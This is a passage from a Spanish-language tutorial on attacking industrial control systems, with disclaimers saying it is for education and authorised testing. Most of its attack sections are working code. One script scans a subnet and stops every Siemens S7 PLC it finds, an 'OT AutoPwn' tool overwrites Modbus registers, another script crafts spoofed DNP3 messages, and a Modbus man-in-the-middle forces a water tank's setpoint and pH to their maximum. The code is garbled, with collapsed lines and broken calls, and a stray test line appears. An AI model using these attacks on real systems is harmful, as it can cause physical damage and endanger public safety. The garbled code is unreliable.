> **IMPORTANTE:** Este tutorial es con fines educativos y de investigación en seguridad. Las técnicas aquí descritas NO deben ser utilizadas contra sistemas sin autorización explícita. Manipular sistemas OT puede causar daños físicos, pérdidas económicas, impacto ambiental y riesgos de seguridad pública. Siempre obtené autorización por escrito antes de realizar pruebas en entornos OT. Practicá solo en laboratorios aislados o simulaciones.

### Laboratorio 7: Cross-protocol Exploitation

**Objetivo:** Usar un [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) OT para atacar otro.

`python
# Escenario: Usar Modbus para obtener información que permite ataque S7
# 1. Encontrar PLC S7 via Modbus
# 2. Leer parámetros de red del S7 desde Modbus
# 3. Atacar S7 con Snap7

from pymodbus.client import ModbustcpClient
from concurrent.futures import ThreadPoolExecutor
import snap7
from snap7 import util

def find_s7_via_modbus(network): \"\"\"Encontrar PLCs S7 escaneando [red](../raw/r3d3s-f0nd4m3nt0s.md) y verificando [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 102\"\"\" import socket found = def check([ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)): try: s = socket.socket s.settimeout(1) s.connect([ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip), 102) s.close return [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) except: return None with ThreadPoolExecutor(max_workers=50) as ex: [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) = [f"{network}.{i}" for i in range(1, 255)] for r in ex.map(check, [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips)): if r: found.append(r) return found

def attack_s7(ip): client = snap7.client.Client try: client.connect(ip, 0, 1, 102) info = client.get_cpu_info print(f"[+] S7 en {ip}: {info.ModuleTypeName.decode}") client.plc_stop print(f"[!] PLC {ip} detenido!") client.disconnect except Exception as e: print(f"[-] {ip}: {e}")

s7_plcs = find_s7_via_modbus("192.168.1")
for plc in s7_plcs: attack_s7(plc)
`

## 14. Recursos y Referencias

### 14.1 Libros
- "Industrial Network Security, 2nd Edition" - Eric D. Knapp
- "Hacking Exposed: [industrial control systems](../raw/0t-sc4d4.md)" - Clint Bodungen
- "Applied Cyber Security and the Smart Grid" - Eric D. Knapp
- "[ics](../raw/0t-sc4d4.md) Security: The Purdue Model" - M. J. Habib
- "[scada](../raw/0t-sc4d4.md) Security: What is Broken and How to Fix It" - Graham Speake
- "Security of Industrial Control Systems and Cyber-Physical Systems" - adrien Becue

### 14.2 Herramientas Open Source
- **ModbusPal:** Simulador Modbus (Java)
- **PLCinject:** Inyeccion de logica en PLCs
- **ISF:** Industrial exploitation Framework
- **GRASSMARLIN:** Diagramacion de [redes](../raw/r3d3s-f0nd4m3nt0s.md) [ot](../raw/0t-sc4d4.md) (DHS/NCATS)
- **Snap7:** Libreria Siemens S7
- **pycomm3:** Libreria Rockwell Cip
- **OpenOCD:** Debugging JTAG
- **flashrom:** Lectura/escritura de flash SPI
- **Binwalk:** Analisis de [firmware](../raw/u3f1-r00tk1ts.md#firmware)
- **s7scan:** Escaner Siemens S7
- **modbus-cli:** Cliente Modbus CLI
- **pymodbus:** Libreria Modbus [python](../raw/pyth0n-f0r-h4ck1ng.md)
- **S7Pocket:** Libreria S7 en Go

### 14.3 Laboratorios Online
- **[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)-h4ckth3b0x.md#[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)):** ICS/SCADA rooms, Attacking ICS Plant
- **[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox):** Maquinas OT (Sauna, Ready)
- **SANS ICS NetWars:** Laboratorio interactivo OT
- **Dragos Community:** Recursos y herramientas
- **ICS-CERT Virtual Training:** Laboratorios gratuitos

### 14.4 Comunidades
- **r/ICS_Security (reddit)**
- **r/SCADA (Reddit)**
- **InfraGard ICS Sector:** Comunidad FBI-sector privado
- **SANS ICS/SCADA Summit:** Conferencia anual
- **ICS Village:** Comunidad de hacking OT (DEF CON)
- **OPCDAY / ICS Conference:** Conferencias OT
- **Troopers:** Conferencia alemana con track ICS

### 14.5 Certificaciones
- **GICSP:** Global Industrial Cyber Security Professional (SANS)
- **GRID:** GIAC Response and Industrial Defense (SANS)
- **ICS410:** ICS/SCADA Security Essentials (SANS)
- **ICS456:** Essentials for OT (SANS)
- **ICS515:** ICS Active Defense and Incident Response (SANS)
- **ISA/IEC 62443:** Cybersecurity Certificate Program
- **CISSP-ISSAP:** Information Systems Security Architecture Professional
- **CEH:** Certified Ethical Hacker (modulo OT)

### 14.6 Estandares y Regulaciones
- **ISA/IEC 62443:** Estandar de seguridad para IACS
- **[nist](../raw/p3nt3st-m3th0d0l0gy.md#nist) SP 800-82:** Guide to ICS Security
- **NERC CIP:** Critical Infrastructure Protection (sector electrico)
- **[iso 27001](../raw/l3g4l-c0mpl14nc3.md#iso-27001):** Con extension ICS
- **[mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck) for ICS:** Matriz de tacticas OT
- **[owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) IoT:** Guias de seguridad para IoT industrial

### 14.7 Conferencias y Eventos
- **SANS ICS Security Summit:** Orlando + online
- **Troopers (Heidelberg):** Track ICS Security
- **OPCDAY:** Seguridad OPC/PLC
- **ICS Village (DEF CON):** Talleres practicos
- **DragosCON:** Conferencia OT anual
- **rsaC ([rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa) Conference):** Track OT
- **BlackHat:** Arsenal de herramientas OT

### 14.8 Advertencia Etica

> **IMPORTANTE:** Este tutorial es con fines educativos y de investigacion en seguridad. Las tecnicas aqui descritas NO deben ser utilizadas contra sistemas sin [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) explicita. Manipular sistemas OT puede causar danos fisicos, perdidas economicas, impacto ambiental y riesgos de seguridad publica. Siempre obtene [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) por escrito antes de realizar pruebas en entornos OT. Practica solo en laboratorios aislados o simulaciones.

---

> *"En OT, el safety es primero. Un error de seguridad puede matar a alguien. No seas ese gil."*

test line for counting

## 15. Anexo A: Packet Crafting [ot](../raw/0t-sc4d4.md)

### 15.1 Modbus [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) Raw Packet

```python
import socket, struct

def craft_modbus_tcp(unit_id, func_code, data, trans_id=1): """Crear un paquete Modbus TCP raw""" mbap = struct.pack('>HHHB', trans_id, 0x0000, len(data) + 2, unit_id) return mbap + bytes([func_code]) + data

# Ejemplo: Read Holding Registers (FC 03), addr 0x0000, qty 10
data = struct.pack('>HH', 0x0000, 10)
pkt = craft_modbus_tcp(1, 0x03, data)
print(pkt.hex)
# 00 01 00 00 00 06 01 03 00 00 00 0A

# Enviar
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect("192.168.1.100", 502)
sock.send(pkt)
resp = sock.recv(1024)
print(f"Respuesta: {resp.hex}")
sock.close
```

### 15.2 Crafting Write Multiple Registers

```python
def modbus_write_multiple(unit_id, addr, values, trans_id=1): """FC 16: Write Multiple Registers""" count = len(values) byte_count = count * 2 data = struct.pack('>HHB', addr, count, byte_count) for v in values: data += struct.pack('>H', v) return craft_modbus_tcp(unit_id, 0x10, data, trans_id)

# Escribir 500, 600, 700 en addr 0x0064 (100)
pkt = modbus_write_multiple(1, 0x0064, [500, 600, 700])
print(pkt.hex)
```

### 15.3 S7comm Raw Packet

```python
def craft_s7_read(area, db_num, offset, size): """Crear paquete S7comm Read""" tpkt = struct.pack('!BBH', 3, 0, 35) cotp = bytes([0x02, 0xF0, 0x80]) s7_params = bytes([ 0x04, 0x01, 0x12, 0x0A, 0x10, 0x02, (size >> 8) & 0xFF, size & 0xFF, (db_num >> 8) & 0xFF, db_num & 0xFF, area, 0x00, 0x00, 0x00, 0x00, ]) s7_hdr = bytes([ 0x32, 0x01, 0x00, 0x00, 0x00, 0x01, (len(s7_params) >> 8) & 0xFF, len(s7_params) & 0xFF, 0x00, 0x00, ]) return tpkt + cotp + s7_hdr + s7_params

# Leer DB1, offset 0, 4 bytes (REAL)
pkt = craft_s7_read(0x84, 1, 0, 4)
print(pkt.hex)
```

### 15.4 DNP3 Unsolicited Message Spoofing

```python
import socket, struct

def _dnp3_crc(data): crc = 0x0000 for b in data: crc ^= b for _ in range(8): if crc & 1: crc = (crc >> 1) ^ 0xA6BC else: crc >>= 1 return struct.pack('<H', crc)

def craft_dnp3_unsolicited(src, dst, grp, var, data): """Crear mensaje DNP3 Unsolicited falso""" app = bytes([0xC2, 0x82]) obj = struct.pack('!BBHH', grp, var, 0x00, 0x01) dl = struct.pack('!HBBHH', 0x0564, len(app)+len(obj)+len(data)+7, 0x44, dst, src) transport = bytes([0xC0]) return dl + _dnp3_crc(dl[2:]) + transport + app + obj + data + _dnp3_crc(transport+app+obj+data)

# Enviar DNP3 Unsolicited falso
def send_dnp3_raw(target_ip, packet): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) sock.connect(target_ip, 20000) sock.send(packet) resp = sock.recv(4096) sock.close return resp
```
## 16. Anexo B: Lista de puertos [ot](../raw/0t-sc4d4.md)

| [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) | [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red))) | Uso |
|--------|-----------|-----|
| 21 | FTP | Transferencia de [firmware](../raw/u3f1-r00tk1ts.md#firmware) |
| 22 | SSH | Acceso remoto a equipos OT |
| 23 | Telnet | Acceso remoto (inseguro, comun en OT) |
| 69 | TFTP | Transferencia de firmware |
| 80 | [http](../raw/r3d3s-f0nd4m3nt0s.md#http) | Configuracion web de dispositivos |
| 102 | ISO-TSAP | Siemens S7comm |
| 443 | [https](../raw/r3d3s-f0nd4m3nt0s.md#https) | Configuracion web segura |
| 502 | Modbus [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) | Comunicacion Modbus |
| 593 | MSEXCH | OPC [com](../raw/w1n-s9bsyst3ms.md#com) ([dcom](../raw/w1n-s9bsyst3ms.md#dcom) alternativo) |
| 1023 | DNP3 | DNP3 serial encapsulado |
| 1080 | SOCKS | [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) industrial (Schneider) |
| 1541 | Fox | Wonderware Suitelink/Foxboro |
| 1542 | Fox | Wonderware Suitelink/Foxboro |
| 1547 | S7 | Siemens S7 (alternativo) |
| 1800 | Siemens | S7-300/TIA Portal comm |
| 1962 | NI | National Instruments |
| 1999 | HONEYWELL | Honeywell HCIS |
| 2000 | DAS | DNP3 puerto historico |
| 2001 | DNP3 | DNP3 Secure Authentication |
| 2022 | OPC | OPC Classic |
| 2031 | HONEYWELL | Honeywell Experion |
| 2222 | EtherNet/[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) | Rockwell implicit I/O |
| 2404 | IEC 60870 | IEC 60870-5-104 |
| 2455 | CODESYS | CODESYS runtime |
| 4000 | ICCP | ICCP/TASE.2 |
| 4840 | OPC UA | OPC UA TCP |
| 4843 | OPC UA | OPC UA over [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) |
| 5050-5055 | ABB | ABB VSN series |
| 5432 | HISTORIAN | OSIsoft PI (PostgreSQL) |
| 5450 | HISTORIAN | OSIsoft PI |
| 5900 | VNC | Acceso remoto a HMI |
| 6410 | YOKOGAWA | Yokogawa FAST/TOOLS |
| 6510 | YOKOGAWA | Yokogawa FAST/TOOLS |
| 7711 | ROCKWELL | Rockwell FactoryTalk |
| 7890 | ROCKWELL | Rockwell activation |
| 8000 | PI | OSIsoft PI Web API |
| 8080 | HTTP | Web alternativo |
| 8443 | HTTPS | Web segura alternativo |
| 9003 | KEPServer | Kepware KEPServerEX |
| 9600 | MODBUS | Modbus sobre TCP (alternativo) |
| 9700 | MODBUS | Modbus over TLS |
| 10001 | BRADLEY | Allen-Bradley CSPv4 |
| 10201 | TELVENT | Telvent OASyS |
| 11000 | CONTROL | Control Microsystems |
| 13000 | SATEL | Satel radio |
| 13600 | SIEMENS | Siemens IPC |
| 14240 | RADWIN | Radwin radio |
| 14434 | MOTOROLA | Motorola ACE |
| 15000 | VIPA | Vipa WinPLC7 |
| 15001 | VIPA | Vipa WinPLC7 |
| 15500 | ROCKWELL | Rockwell FT activation |
| 15501 | ROCKWELL | Rockwell FT activation |
| 15978 | SIEMENS | Siemens IPC |
| 17221 | ROCKWELL | Rockwell AssetCentre |
| 17500 | ROCKWELL | Rockwell [dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp) |
| 17553 | SIEMENS | Siemens S7 PLCSIM |
| 18181 | SYMANTEC | Symantec BUE (OT backup) |
| 18245 | ROCKWELL | Rockwell GP |
| 18246 | ROCKWELL | Rockwell GP |
| 18300 | SIEMENS | Siemens IPC |
| 18444 | SIEMENS | Siemens IPC |
| 19001 | SIEMENS | Siemens IPC |
| 19100 | MTS | MTS Berbee |
| 19531 | SIEMENS | Siemens IPC |
| 19777 | ROCKWELL | Rockwell GP |
| 19800 | SIEMENS | Siemens IPC |
| 19999 | DNP3 | DNP Secure auth |
| 20000 | DNP3 | DNP3 por defecto |
| 20547 | ROCKWELL | Rockwell GP |
| 20607 | ROCKWELL | Rockwell GP |
| 20807 | ROCKWELL | Rockwell GP |
| 34962 | PROFINET | PROFINET RT |
| 34963 | PROFINET | PROFINET RT |
| 34964 | PROFINET | PROFINET DCP |
| 41129 | ROCKWELL | Rockwell GP |
| 44818 | EtherNet/IP | Rockwell explicit messaging |
| 47808 | BACnet | BACnet/IP (BIP) |
| 47809-47823 | BACnet | BACnet/IP (alternativos) |
| 49153-49156 | PROFINET | PROFINET [rpc](../raw/w1n-s9bsyst3ms.md#rpc) |

## 17. Anexo C: mitre att&ckc for [ics](../raw/0t-sc4d4.md)

Tacticas y tecnicas relevantes para [ot](../raw/0t-sc4d4.md):

| Tactica | ID | Nombre | Descripcion |
|---------|----|--------|-------------|
| Initial Access | T0811 | Internet Accessible Device | Dispositivo OT expuesto a internet |
| Initial Access | T0822 | External Remote Services | Servicios remotos ([vpn](../raw/4n0n1m4t0.md#vpn), RDP, Vnc) |
| Initial Access | T0843 | Wireless compromise | Ataque a [redes](../raw/r3d3s-f0nd4m3nt0s.md) wireless industriales |
| Execution | T0847 | Modbus Write | Escritura Modbus maliciosa |
| Execution | T0848 | DNP3 Write | Escritura DNP3 maliciosa |
| Execution | T0863 | S7 Write | Escritura S7comm maliciosa |
| Execution | T0864 | Crafted Protocol Message | Mensaje de [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red))) manipulado |
| persistence | T0857 | Program Download | Descarga de programa al PLC |
| Persistence | T0858 | Modify Controller Logic | Modificacion de logica de control |
| Evasion | T0849 | Block Reporting Message | Bloqueo de mensajes de reporte |
| Evasion | T0850 | Modify Alarm settings | Modificacion de alarmas |
| Discovery | T0886 | Remote System Info Discovery | Descubrimiento de informacion remota |
| Discovery | T0887 | Network Sniffing | Captura de trafico de [red](../raw/r3d3s-f0nd4m3nt0s.md) |
| Discovery | T0888 | I/O Module Discovery | Descubrimiento de modulos I/O |
| Lateral Movement | T0867 | [exploit](../raw/m3t4spl01t.md#exploits) Remote Services | Explotacion de servicios remotos |
| Lateral Movement | T0869 | Default Credentials | Credenciales por defecto |
| Collection | T0882 | Automated Collection | Recoleccion automatica de datos |
| Collection | T0883 | Data from Info Repositories | Datos de repositorios |
| [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) | T0885 | Commonly Used Port | Uso de puertos comunes |
| C2 | T0889 | Standard App Layer Protocol | Protocolo de capa de aplicacion |
| Inhibit Response | T0866 | Denial of Service | Denegacion de servicio |
| Inhibit Response | T0896 | Spoof Reporting Message | Suplantacion de mensajes |
| Impair Process | T0840 | Modify Parameter | Modificacion de parametros |
| Impair Process | T0841 | Unauthorized Command Message | Comando no autorizado |
| Impair Process | T0843 | Program State Manipulation | STOP/START de PLC |
| Impact | T0879 | Damage to Property | Dano a la propiedad |
| Impact | T0881 | Loss of Safety | Perdida de seguridad |
| Impact | T0884 | Loss of View | Perdida de visibilidad |
| Impact | T0865 | Manipulation of View | Manipulacion de vista |
## 18. Anexo D: Cheatsheet de comandos [ot](../raw/0t-sc4d4.md)

### Descubrimiento
```bash
# Nmap multi-protocolo OT
nmap -p 502,102,20000,44818,4840,47808 -sV -O \ --script "modbus-*,s7-info*,enip-info*,bacnet-info*" \ 192.168.1.0/24

# Masscan (rapido, hasta 100k pps)
masscan -p502,102,20000,44818,4840 --rate=10000 192.168.1.0/24

# Shodan
shodan search "port:502 country:AR"

# Zeek para analisis OT
zeek -r ot_capture.pcap protocols/modbus protocols/s7 protocols/dnp3
```

### Modbus
```bash
# Leer registros
modbus -r -p 502 192.168.1.100 0 100
python -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('192.168.1.100'); c.connect; print(c.read_holding_registers(0,10).registers); c.close"

# Escribir registros
modbus -w -p 502 192.168.1.100 100 0
modbus -w -t coil 192.168.1.100 5 1

# NSE scripts
nmap -p 502 --script modbus-discover 192.168.1.100
nmap -p 502 --script modbus-enum --script-args="modbus-enum.unit=0" 192.168.1.100
```

### Siemens S7
```bash
# Conectar y obtener info
python -c "
import snap7; from snap7 import util
c = snap7.client.Client; c.connect('192.168.1.200',0,1)
print(c.get_cpu_info.ModuleTypeName)
print(c.get_cpu_state)
c.disconnect
"

# s7scan
python s7scan.py 192.168.1.0/24

# Leer DB
python -c "
import snap7; from snap7 import util
c = snap7.client.Client; c.connect('192.168.1.200',0,1)
db1 = c.read_area(snap7.types.areas.DB, 1, 0, 100)
print(f\"Temp: {util.get_real(db1,0):.1f}\")
c.disconnect
"
```

### DNP3
```bash
# Filtros Wireshark
dnp3.func_code == 4
dnp3.obj.grp == 12
dnp3.con

# Captura
tshark -i eth0 -Y "dnp3" -w dnp3.pcap
tshark -r dnp3.pcap -Y "dnp3.func_code==4" -T fields -e ip.src -e dnp3.grp_var
```

### [firmware](../raw/u3f1-r00tk1ts.md#firmware)
```bash
# Analisis
binwalk firmware.bin
binwalk -Me firmware.bin

# Extraccion SPI
flashrom -p ch341a_spi -r firmware.bin
flashrom -p ch341a_spi -w modified.bin

# OpenOCD JTAG
echo "halt; dump_image fw.bin 0x08000000 0x100000; exit" | openocd -f config.cfg
```

## 19. Anexo E: Casos Reales de Ataques [ot](../raw/0t-sc4d4.md)

### 19.1 Stuxnet (2010)

El ataque mas famoso a infraestructura critica. Fue un gusano diseñado para atacar centrifugadoras de uranio en Iran.

**Tecnicas usadas:**
- Modificacion de logica de PLC (Siemens S7-300)
- Spoofing de senales de frecuencia (420-1064 Hz)
- Intercepcion de datos de [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) (grabar valores normales y reproducirlos)
- Propagacion via USB y network shares
- Cuatro exploits de zero-day

**Lecciones:**
- La seguridad por air gap no es suficiente
- Los PLCs pueden ser reprogramados sin [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion)
- La manipulacion de vista (loss of view) enmascara el ataque
- Los ataques OT pueden causar daño [fisico](../raw/ph7s1c4l-r3d.md)

### 19.2 Industroyer (2016)

Ataque a la [red](../raw/r3d3s-f0nd4m3nt0s.md) electrica de Ucrania usando protocolos OT directamente.

**Tecnicas:**
- Uso de IEC 60870-5-101, 104 y OPC DA
- comandos maliciosos de apertura de breakers
- Borrado de [firmware](../raw/u3f1-r00tk1ts.md#firmware) de dispositivos de red serial
- DoS en salas de control (wiper en servidores)

**Protocolos explotados:** IEC 60870-5-104, IEC 60870-5-101, OPC DA.

### 19.3 TRITON/TRISIS (2017)

Ataque a sistemas de seguridad (SIS - Safety Instrumented Systems) en una planta petroquimica en Arabia Saudita.

**Tecnicas:**
- Ingenieria inversa del [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) propietario de Schneider Triconex
- Manipulacion de firmware del SIS
- Malware que interactua con el controlador de seguridad (TCM)
- Capacidad de causar daño fisico o ambiental

**Lecciones importantes:**
- Los sistemas de seguridad tambien son vulnerables
- Los protocolos propietarios no son inherentemente seguros
- El conocimiento de ingenieria inversa es critico para OT

### 19.4 vpnFilter (2018)

Malware que afecto routers y switches industriales (incluyendo dispositivos OT).

**Tecnicas:**
- [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) en firmware (sobrevive a reboots)
- Capacidad de destruir firmware del dispositivo
- Recoleccion de trafico OT (Modbus, DNP3 sniffing)
- [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) via [tor](../raw/4n0n1m4t0.md#tor)

### 19.5 Colonial [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) (2021)

Ataque de ransomware a una empresa de oleoductos en EEUU que causo desabastecimiento de combustible.

**Tecnicas:**
- Ransomware en IT que afecto operaciones OT
- Credenciales comprometidas de [vpn](../raw/4n0n1m4t0.md#vpn) (sin MFA)
- Paralizacion de sistema de billing (forzo parada del oleoducto)
- Pago de rescate: $4.4M

**Lecciones:**
- La separacion IT/OT es esencial pero no suficiente
- El ransomware en IT puede detener operaciones OT
- MFA en todos los accesos remotos es critico

### 19.6 Industroyer2 (2022)

Segundo ataque a la red electrica de Ucrania durante la invasion rusa.

**Tecnicas:**
- IEC 60870-5-104 exploitation
- Wiper multiple en estaciones de trabajo
- spear [phishing](../raw/ph1sh1ng.md#spear-phishing)) dirigido a personal OT
- Coordinacion con ataques cineticos

## 20. Anexo F: Laboratorio Avanzado [ot](../raw/0t-sc4d4.md)

### 20.1 Entorno completo con [docker](../raw/d0ck3r-f0r-h4ck3rs.md)

```bash
# Docker Compose para laboratorio OT completo
cat > docker-compose-ot.yml << 'DCEOF'
version: "3.8"
services: # PLC Modbus simulado modbus-plc: image: oitc/modbus-server ports: - "5020:502" environment: - REGISTERS=0-100 - COILS=0-50 # PLC S7 simulado s7-plc: image: s7-connect/s7-server ports: - "1020:102" # HMI web hmi: image: nginx:alpine ports: - "8080:80" volumes: - ./hmi:/usr/share/nginx/html # Wireshark para captura capture: image: ntop/ntopng network_mode: "host" environment: - INTERFACE=eth0 # IDS OT ids: image: jasonish/suricata:latest command: -i eth0 volumes: - ./suricata:/etc/suricata - ./rules:/etc/suricata/rules
DCEOF

# Iniciar
docker-compose -f docker-compose-ot.yml up -d
```

### 20.2 Script de Ataque Automatico

```python
#!/usr/bin/env python3
"""
autopwn_ot.py - Ataque automatico a dispositivos OT
"""
import argparse, socket, struct, time, sys
from pymodbus.client import ModbusTcpClient
from concurrent.futures import ThreadPoolExecutor, as_completed

BANNER = """ ___ _____  _ ____  _ _ ___ _ _ / _ \_ _|/ \  | _ \| | | |_ _| \ | |
 | (_) || | / _ \ |  _/| |_| || ||  \| | \___/ |_|/_/ \_\|_| \___/|___|_|\_\_| OT AutoPwn - Industrial Exploitation Tool
"""

def scan_network(network, ports): """Escanea red en busca de puertos OT abiertos""" found = def check(ip, port): try: s = socket.socket s.settimeout(1) s.connect(ip, port) s.close return (ip, port) except: return None with ThreadPoolExecutor(max_workers=100) as ex: futures = for i in range(1, 255): for p in ports: futures.append(ex.submit(check, f"{network}.{i}", p) for f in as_completed(futures): r = f.result if r: found.append(r) return found

def exploit_modbus(ip): """Explotar PLC Modbus""" try: c = ModbusTcpClient(ip, port=502, timeout=3) c.connect regs = c.read_holding_registers(0, 20).registers coil = c.read_coils(0, 1).bits[0] print(f"  [Modbus] {ip}: {len(regs)} regs | Coil0={coil}") # Si encontramos registros, modificar algunos if len(regs) > 0: c.write_register(0, 0)  # Reset R0 print(f"  [!] Modbus: Reset R0 en {ip}") c.close return True except: return False

def exploit_s7(ip): """Explotar PLC Siemens S7""" try: import snap7 client = snap7.client.Client client.connect(ip, 0, 1, 102) info = client.get_cpu_info name = info.ModuleTypeName.decode state = client.get_cpu_state print(f"  [S7] {ip}: {name} | {state}") client.disconnect return True except: return False

def main: parser = argparse.ArgumentParser(description="OT AutoPwn") parser.add_argument("network", help="Red a escanear (ej: 192.168.1)") parser.add_argument("--exploit", choices=["modbus", "s7", "all"], default="all") args = parser.parse_args print(BANNER) print(f"[*] Escaneando {args.network}.0/24..") ports = if args.exploit in ["modbus", "all"]: ports.append(502) if args.exploit in ["s7", "all"]: ports.append(102) devices = scan_network(args.network, ports) print(f"[+] Dispositivos encontrados: {len(devices)}") for ip, port in devices: print(f" {ip}:{port} ({'Modbus' if port==502 else 'S7' if port==102 else '?'})") print("\n[*] Explotando..") for ip, port in devices: if port == 502: exploit_modbus(ip) elif port == 102: exploit_s7(ip)

if __name__ == "__main__": main
```

### 20.3 Lab: Ataque a Tanque de Agua Controlado por Modbus

**Escenario:** Simulacion de tanque de agua con PLC Modbus.

```python
#!/usr/bin/env python3
"""
water_tank_lab.py - Simulacion de tanque de agua para practicas
"""
from pymodbus.server import StartTcpServer
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
from pymodbus.datastore import ModbusSequentialDataBlock
import threading, time, random, os, signal

class WaterTank: def __init__(self): self.store = ModbusSlaveContext(zero_mode=True, di=ModbusSequentialDataBlock(0, [0]*50), co=ModbusSequentialDataBlock(0, [0]*50), hr=ModbusSequentialDataBlock(0, [0]*100), ir=ModbusSequentialDataBlock(0, [0]*50) # Estado inicial self.store.setValues(3, 0, [50]) # R0: Nivel (%) self.store.setValues(3, 1, [75]) # R1: Setpoint (%) self.store.setValues(3, 2, [0]) # R2: Caudal entrada self.store.setValues(3, 3, [0]) # R3: Caudal salida self.store.setValues(3, 4, [23]) # R4: Temperatura (C) self.store.setValues(3, 5, [7.0])  # R5: pH self.store.setValues(3, 6, [2.5])  # R6: Cloro (ppm) self.store.setValues(3, 10, [0]) # R10: Presion (bar) self.running = True def simulate(self): while self.running: level = self.store.getValues(3, 0, 1)[0] setpoint = self.store.getValues(3, 1, 1)[0] pump_in = self.store.getValues(1, 0, 1)[0] pump_out = self.store.getValues(1, 1, 1)[0] valve_drain = self.store.getValues(1, 2, 1)[0] # Logica de llenado/vaciado if pump_in and level < 100: level = min(level + 3, 100) if pump_out and level > 0: level = max(level - 2, 0) if valve_drain and level > 0: level = max(level - 5, 0) self.store.setValues(3, 0, [level]) # Simular fluctuacion de temperatura temp = self.store.getValues(3, 4, 1)[0] temp += random.uniform(-0.5, 0.5) self.store.setValues(3, 4, [round(temp, 1)]) # Simular pH ph = self.store.getValues(3, 5, 1)[0] ph += random.uniform(-0.1, 0.1) self.store.setValues(3, 5, [round(ph, 1)]) # Alarmas high_level = 1 if level > 90 else 0 low_level = 1 if level < 10 else 0 high_temp = 1 if temp > 40 else 0 self.store.setValues(1, 10, [high_level]) self.store.setValues(1, 11, [low_level]) self.store.setValues(1, 12, [high_temp]) time.sleep(0.5) def start(self): context = ModbusServerContext(slaves=self.store, single=True) sim = threading.Thread(target=self.simulate, daemon=True) sim.start print("[*] Water Tank PLC iniciado en 0.0.0.0:502") print("[*] R0=Nivel R1=Setpoint R4=Temp R5=pH") print("[*] C0=BombaEntrada C1=BombaSalida C2=ValvulaDrenaje") print("[*] C10=AltaNivel C11=BajaNivel C12=AltaTemp") print("[*] Presiona Ctrl+C para detener\n") StartTcpServer(context, address=('0.0.0.0', 502)

if __name__ == "__main__": tank = WaterTank try: tank.start except KeyboardInterrupt: tank.running = False
```

### 20.4 Lab: Modbus [mitm](../raw/m1tm-m0b1l3.md) Attack

```python
#!/usr/bin/env python3
"""
modbus_mitm.py - Man-in-the-Middle en trafico Modbus
"""
import socket, struct, threading, time
from collections import defaultdict

class ModbusMITM: def __init__(self, listen_host="0.0.0.0", listen_port=502, target_host="192.168.1.100", target_port=502): self.listen = (listen_host, listen_port) self.target = (target_host, target_port) self.clients = {} self.modified_registers = defaultdict(dict) def intercept_write(self, data): """Interceptar y modificar escrituras""" unit_id = data[6] func_code = data[7] if func_code == 6:  # Write Single Register addr = struct.unpack('>H', data[8:10])[0] val = struct.unpack('>H', data[10:12])[0] print(f"  [!] Intercepted Write: R{addr} = {val}") # Modificar si es un registro critico if addr == 1:  # Setpoint val = 100 # Forzar al maximo data = data[:8] + struct.pack('>HH', addr, val) print(f"  [!!] MODIFIED: R{addr} = 100 (MAX)") elif addr == 5:  # pH setpoint val = 14 # Forzar alcalino data = data[:8] + struct.pack('>HH', addr, val) print(f"  [!!] MODIFIED: R{addr} = 14 (pH MAX)") return data def handle_client(self, client_sock, addr): print(f"[+] Cliente conectado: {addr}") target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) target_sock.connect(self.target) def forward(src, dst, direction, modify=False): try: while True: data = src.recv(4096) if not data: break if modify: data = self.intercept_write(data) dst.send(data) except: pass # Forward en ambos sentidos t1 = threading.Thread(target=forward, args=(client_sock, target_sock, "C->T", True) t2 = threading.Thread(target=forward, args=(target_sock, client_sock, "T->C", False) t1.start; t2.start t1.join; t2.join target_sock.close client_sock.close print(f"[-] Cliente desconectado: {addr}") def start(self): """Iniciar servidor MITM""" server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) server.bind(self.listen) server.listen(5) print(f"[*] Modbus MITM escuchando en {self.listen[0]}:{self.listen[1]}") print(f"[*] Reenviando a {self.target[0]}:{self.target[1]}") print("[*] Escriburas a registros 1 y 5 seran modificadas!\n") try: while True: client, addr = server.accept t = threading.Thread(target=self.handle_client, args=(client, addr) t.start except KeyboardInterrupt: print("\n[*] MITM detenido.")

if __name__ == "__main__": mitm = ModbusMITM(listen_port=502, target_host="192.168.1.100", target_port=502) mitm.start
```

## 21. Anexo G: Protocol Deep Dives

### 21.1 Modbus Exception Codes

Cada exception code tiene causas especificas:

### 21.2 S7comm Block Types

```python
